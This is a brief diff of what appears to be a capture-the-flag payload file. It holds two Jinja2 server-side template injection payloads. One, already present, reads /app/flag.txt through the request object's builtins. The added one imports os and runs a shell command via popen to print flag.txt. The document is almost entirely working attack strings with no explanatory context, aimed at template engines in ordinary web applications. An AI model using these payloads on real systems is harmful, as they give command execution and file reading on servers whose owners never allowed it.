@@ -21,3 +21,9 @@ v2
 
 
 {{ request.__class__._load_form_data.__globals__.__builtins__.open("/app/flag.txt").read() }}
+
+
+--------------------------------------------------------------------
+
+
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
